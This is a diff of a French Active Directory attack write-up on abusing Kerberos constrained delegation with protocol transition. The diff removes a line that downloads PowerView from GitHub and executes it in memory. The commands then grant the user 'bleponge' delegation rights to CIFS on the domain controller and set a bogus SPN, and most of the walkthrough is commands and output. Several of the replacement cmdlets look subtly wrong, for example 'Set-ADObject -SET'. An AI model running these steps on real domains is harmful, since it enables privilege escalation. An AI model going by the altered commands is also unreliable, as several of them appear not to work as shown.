@@ -43,8 +43,7 @@ Rentrons dans le vif du sujet.
 
 La première chose intéressante est de pouvoir énumérer les comptes de service concernés par T2A4D :  
 ```powershell
-PS C:\tools> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
-PS C:\tools> Get-DomainObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+PS C:\tools> Get-ADObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
 
 
 samaccounttype           : MACHINE_ACCOUNT
@@ -355,7 +354,7 @@ PS C:\> net user bleponge /domain | Select-String "Group"
 Local Group Memberships
 Global Group memberships     *Domain Users
 
-PS C:\> Get-DomainUser -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+PS C:\> Get-ADObject -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
 
 
 samaccounttype     : USER_OBJECT
@@ -367,8 +366,8 @@ samaccountname     : bleponge
 
 PS C:\> Get-ADUser -Identity bleponge | Set-ADAccountControl -TrustedToAuthForDelegation $True
 PS C:\> Set-ADUSer -Identity bleponge -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/DC.WINDOMAIN.LOCAL','CIFS/DC')}
-PS C:\> Set-DomainObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
-PS C:\> Get-DomainUser -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+PS C:\> Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+PS C:\> Get-ADObject -Identity bleponge -Properties DistinguishedName,sAMAccountName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
 
 
 samaccounttype           : USER_OBJECT
@@ -378,7 +377,7 @@ msds-allowedtodelegateto : {CIFS/DC, CIFS/DC.WINDOMAIN.LOCAL}
 samaccountname           : bleponge
 ```
   
-Attention à la commande ```Set-DomainObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}```.  
+Attention à la commande ```Set-ADObject -Identity bleponge -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}```.  
 En effet le bon sens nous dit qu'un utilisateur sera légitime pour déléguer si ce dernier apparait comme compte de service. Sans positionner de SPN sur l'utilisateur ```bleponge```, Rubeus nous a tout simplement propagé une exception, une référence sur un SPN semblant obligatoire:  
 ```
 ...
